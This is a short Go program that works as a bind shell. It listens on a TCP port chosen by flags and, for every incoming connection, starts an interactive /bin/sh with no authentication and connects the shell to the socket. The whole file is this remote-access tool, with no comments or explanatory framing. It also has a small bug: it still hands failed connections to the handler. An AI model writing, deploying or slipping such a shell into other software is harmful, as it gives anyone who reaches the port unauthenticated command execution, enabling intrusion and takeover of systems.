package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
)

func main() {
	addrPtr := flag.String("a", "", "Listen address")
	portPtr := flag.Int("p", 8000, "Listen port")
	flag.Parse()
	addr := *addrPtr
	port := *portPtr

	listAddr := fmt.Sprintf("%s:%d", addr, port)
	listener, err := net.Listen("tcp", listAddr)
	if err != nil {
		log.Fatalf("Failed to bind to address %s: %s", listAddr, err)
	}
	log.Printf("Listening on %s\n", listAddr)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Failed to accept connection: %s", err)
		}

		go handle(conn)
	}
}

func handle(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	cmd.Stderr = wp
	go io.Copy(conn, rp)
	if err := cmd.Run(); err != nil {
		log.Printf("Failed to execute command for %s: %s\n", conn.RemoteAddr(), err)
	}
	conn.Close()
}
